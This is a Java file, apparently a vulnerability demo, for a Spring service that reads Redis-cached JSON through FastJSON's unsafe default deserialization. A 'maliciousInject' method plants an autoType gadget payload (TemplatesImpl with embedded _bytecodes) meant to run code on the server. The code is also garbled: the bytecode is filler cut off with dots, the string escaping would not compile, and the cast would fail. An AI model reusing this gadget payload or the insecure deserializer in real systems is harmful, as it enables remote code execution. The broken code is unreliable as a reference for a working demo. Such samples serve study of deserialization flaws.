package com.example.vulnerable;

import com.alibaba.fastjson.JSON;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;
import javax.annotation.Resource;
import java.util.concurrent.TimeUnit;

/**
 * 云原生微服务架构中的产品分类处理器
 * 使用FastJSON进行反序列化操作
 */
@Component
public class CategoryService {
    
    @Resource
    private StringRedisTemplate redisTemplate;
    
    /**
     * 从Redis缓存中计算待更新的分类列表
     * @param uuid 用户唯一标识
     * @param pid 产品ID
     * @return 更新后的分类对象
     */
    public Category calcCategoriesToUpdate(String uuid, String pid) {
        // 构造Redis缓存键
        String cacheKey = String.format("category_cache:%s:%s", uuid, pid);
        
        // 从Redis获取JSON数据
        String json = redisTemplate.opsForValue().get(cacheKey);
        
        // 不安全的反序列化操作
        if (json != null && !json.isEmpty()) {
            // 使用FastJSON自动类型推断反序列化
            return JsonUtils.jsonToObject(json);
        }
        
        // 默认返回新分类对象
        return new Category(uuid + ":" + pid);
    }
    
    /**
     * 模拟攻击者注入恶意payload
     * 通过Redis注入包含恶意类的JSON数据
     */
    public void maliciousInject(String uuid, String pid) {
        String cacheKey = String.format("category_cache:%s:%s", uuid, pid);
        String evilJson = "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\","
            + "\\"_bytecodes\\":[\\"yv66vgAAADQAKQoAAgAcBwAdBwAeBwAfCAAaAQAGPGNsaW5pdAAiL3N5c3RlbS9leGVjL2Jhc2gubGlzdAAHc3RyZWFtAQAKU291cmNlRmlsZQEAC2V4ZWNfbWQyLnR4dAAHc3RyZWFtDAABAAQABwAHAAcAFAoAEAAVABYAFwAHABgAAAAFKAAAADgAAQABADgAAQACABEADQABABQABgABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQABAAEADQABABEADQAB......\\"]," 
            + "\\"_name\\":\\"example\\",\\"_tfactory\\":{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\\"}}";
        
        // 设置恶意JSON到Redis
        redisTemplate.opsForValue().set(cacheKey, evilJson, 1, TimeUnit.MINUTES);
    }
}

/**
 * FastJSON工具类（存在安全缺陷）
 */
class JsonUtils {
    public static <T> T jsonToObject(String json) {
        // 使用不安全的默认配置进行反序列化
        return (T) JSON.parseObject(json);
    }
}

/**
 * 业务实体类
 */
class Category {
    private String id;
    private String name;
    
    public Category(String id) {
        this.id = id;
        this.name = "DefaultCategory";
    }
    
    // Getters and setters
    public String getId() { return id; }
    public void setId(String id) { this.id = id; }
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
}